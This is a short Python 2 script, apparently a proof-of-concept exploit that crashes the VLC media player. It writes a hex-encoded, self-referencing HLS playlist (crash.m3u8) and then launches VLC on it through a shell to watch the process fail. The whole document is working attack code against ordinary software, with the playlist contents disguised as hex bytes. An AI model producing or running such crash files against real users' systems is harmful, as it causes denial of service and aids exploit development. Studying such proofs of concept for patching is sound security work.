#!/usr/bin/python

import os
import subprocess
from subprocess import Popen
from time import sleep

filename = "crash.m3u8" # Or .m3u
 
buffer = ("\x23\x45\x58\x54\x4d\x33\x55\r\n\x23"
 
          "\x45\x58\x54\x2d\x58\x2d\x53\x54\x52"
 
          "\x45\x41\x4d\x2d\x49\x4e\x46\x3a\x50"
 
          "\x52\x4f\x47\x52\x41\x4d\x2d\x49\x44"
 
          "\x3d\x31\x2c\x42\x41\x4e\x44\x57\x49"
 
          "\x44\x54\x48\x3d\x31\x2c\x52\x45\x53"
 
          "\x4f\x4c\x55\x54\x49\x4f\x4e\x3d\x31"
 
          "\x32\x30\x78\x33\x36\x30\r\n")
 
buffer += filename
 
open(filename, "wb").write(buffer)

cmd = "vlc crash.m3u8 >/dev/null 2>&1"
proc = Popen(cmd,shell=True)
print ("process id = %s" % proc.pid)
print proc
sleep(15)
print proc
print proc.returncode
proc.terminate()
